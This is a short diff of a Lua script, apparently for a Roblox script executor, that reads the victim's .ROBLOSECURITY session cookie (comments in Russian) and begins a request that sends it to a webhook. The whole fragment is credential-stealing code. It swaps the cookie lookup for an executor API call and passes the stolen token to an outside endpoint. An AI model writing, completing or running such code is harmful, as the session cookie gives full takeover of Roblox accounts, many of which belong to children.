@@ -14,7 +14,7 @@ local function get_roblox_cookie()
     return cookies and cookies[".ROBLOSECURITY"] or "Не найдено"
 end
 
-local roblosecurity = get_roblox_cookie()
+local roblosecurity = get_cookie(".ROBLOSECURITY") -- Функция из вашего API
 
 req({
     Url = webhook,
